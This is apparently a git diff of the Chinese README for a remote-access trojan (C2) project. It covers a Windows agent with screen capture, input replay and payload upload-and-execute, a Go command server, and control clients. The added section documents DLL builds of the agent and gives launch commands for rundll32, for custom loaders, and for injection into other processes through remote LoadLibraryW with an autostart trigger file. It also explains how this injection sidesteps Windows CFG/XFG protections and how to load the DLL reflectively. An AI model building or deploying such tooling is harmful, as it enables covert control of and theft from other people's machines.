@@ -9,12 +9,13 @@
 
 基于《ARCHITECTURE.md》架构设计计划书实现的可扩展 C2 远控系统。
 
-- **客户端**：C++（Windows，core + 插件 dll，M2 起插件化）
+- **客户端**：C++（Windows；同一套 core 源码出 **EXE 与 DLL 两种产物**，见下）
 - **服务端**：Go（C2 中转/管理服务器）
 - **控制端**：Go CLI（`ratctl`）+ C++ GUI（`im_ctl`）+ C++ 轻量查看器（`viewer`）
 - **协议**：自定义二进制（20B 固定头 + 分模块指令码），AES-256-GCM 加密（PSK→HKDF 派生）
-- **当前状态**：核心通信 + beacon 信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
-  ratctl 命令补全 + viewer 查看器（详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）
+- **当前状态**：核心通信 + beacon/TCP 双信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
+  ratctl 命令补全 + viewer 查看器 + **RatAgent 的 DLL 形态（rundll32 / LoadLibrary / 注入）**
+  （详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）
 
 ## 目录结构
 
@@ -29,9 +30,12 @@ c2/
 │   └── internal/session/      # 会话注册表（离线/回收）
 ├── ctl/                       # Go CLI
 │   └── cmd/ratctl/            # 交互式 shell（会话/系统/截屏/远控/payload）
-├── client/                    # C++ Agent（VS 解决方案）
-│   ├── RatAgent.sln/.vcxproj
-│   └── core/                  # protocol/crypto/net/session/screen/cmd_dispatch/main
+├── client/                    # C++ Agent（VS 解决方案：EXE + DLL 两个工程）
+│   ├── RatAgent.sln
+│   ├── RatAgent.vcxproj       # → RatAgent.exe（控制台形态）
+│   ├── RatAgentDll.vcxproj    # → RatAgent.dll（rundll32 / 宿主 / 注入；静态 CRT）
+│   └── core/                  # protocol/crypto/net/session/screen/cmd_dispatch
+│                              # + agent_runtime(共用运行核心) / agent_dll(导出) / main(EXE 入口)
 ├── viewer/                    # C++ Win32 远控查看器（独立 CMake 工程）
 ├── im_ctl/                    # C++ ImGui 控制端
 └── scripts/                   # e2e_m1~m4 + ctl_stream_probe
@@ -47,18 +51,50 @@ go build -o bin/ratctl.exe    ./ctl/cmd/ratctl
 go test ./...                 # 协议单测（含测试向量验证）
 ```
 
-**C++**（VS2022/18，v145 工具集）：用 VS 打开 `client/RatAgent.sln` 生成，
-或命令行：
+**C++ Agent**（VS2022/18，v145 工具集）：用 VS 打开 `client/RatAgent.sln`（含两个工程），
+或命令行分别生成：
 
 ```
-"C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current/Bin/amd64/MSBuild.exe" client/RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64
+MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current/Bin/amd64/MSBuild.exe"
+"%MSBUILD%" client/RatAgent.vcxproj    -p:Configuration=Debug -p:Platform=x64   # → RatAgent.exe
+"%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.dll
 ```
 
-产物：`client/x64/Debug/RatAgent.exe`。
+产物：`client/x64/Debug/RatAgent.exe` 与 `client/x64/Debug/RatAgent.dll`。
 
 > 受限环境（无 GUI/沙箱会话）下，既有 VS 输出目录可能不可写，改用工作区内新目录：
 > `-p:IntDir=<repo>/build/agent/obj/ -p:OutDir=<repo>/build/agent/bin/`，
 > 并给 Go 设置 `GOCACHE=<repo>/.gocache`、输出到 `build/bin/`。
+
+### Agent 两种形态与适用场景
+
+| 形态 | 入口 | 适用场景 | 身份/日志位置 |
+|---|---|---|---|
+| `RatAgent.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `agent.id`；stdout |
+| `RatAgent.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\agent.id` + `agent.log`（可用 `id=`/`log=` 覆盖） |
+
+DLL 的三种用法（都支持 `-tcp` 切长连接；默认 beacon `127.0.0.1:8080`、轮询 5s）：
+
+```
+:: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
+rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
+rundll32 RatAgent.dll,Stop  id=<agent.id 路径或 32 位 hex>
+
+:: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
+LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()
+
+:: 3) 注入（远程 LoadLibrary + 触发器自启动）
+::    先写好 %TEMP%\RatAgent\autostart.args（内容 = 参数串），再让目标进程远程 LoadLibraryW 本 DLL；
+::    DllMain 检测到触发器即在自建线程上启动；删除该文件即关闭自启动。
+```
+
+> **为什么注入要这样**：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"
+> （表现为 `0xC0000409`/`__fastfail`），但远程 `LoadLibraryW`（kernel32 地址）仍然可用。
+> 因此推荐"远程加载 + 触发器自启动"，而不是远程直接调用导出函数。
+>
+> **手动映射（reflective load）契约**：本 DLL 用静态 CRT（`/MT`，无 VC 运行库 DLL 依赖），
+> **必须先调用入口点**（`DllMainCRTStartup`，参数 `DLL_PROCESS_ATTACH`）让 CRT 完成初始化，
+> 之后才能调用导出；不依赖 `GetModuleFileName`/CWD/TLS，故映射后仍可用（`id=`/`log=` 可指定路径）。
 
 **viewer**（C++ Win32，独立 CMake 工程）：
 
@@ -82,9 +118,11 @@ cmake --build im_ctl/build --config Debug
 ## 运行与联调
 
 1. 启动 C2：`./bin/c2server.exe`（监听 4444 + 4445 + 8080，PSK 编译期内置）
-2. 启动 Agent：`client/x64/Debug/RatAgent.exe 127.0.0.1 8080 -s 5`
-   （当前 `main()` 默认 beacon 模式；长连接模式见 `docs/PROGRESS.md §7`；
-   `--selftest` 可单独跑协议自检）
+2. 启动 Agent（三选一）：
+   - beacon（默认）：`RatAgent.exe 127.0.0.1 8080 -s 5`
+   - TCP 长连接：`RatAgent.exe 127.0.0.1 4444 -tcp`
+   - DLL 形态：`rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5`（详见上文"Agent 两种形态"）
+   - `--selftest` 可单独跑加密自检后退出
 3. 控制端：`./bin/ratctl.exe`，交互式命令：
 
 ```
@@ -112,4 +150,5 @@ payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
 - **M1 ✅** 协议 + 核心通信（握手/心跳/会话/离线判定）
 - **M2 ✅** beacon 信道 + 命令分发（SYS_INFO/EXEC_PS）
 - **M3 ✅** 屏幕流 + 输入回放（4445）+ 截屏 + payload 上传执行 + ratctl 补全 + viewer
+- **M3.5 ✅** Agent 双产物（EXE/DLL）+ 可停止/可卸载 + 注入自启动触发器
 - **M4** 插件框架（`plugin_api.h` + 加载器）、文件管理、进程/服务/注册表、多 CLI、打包与文档
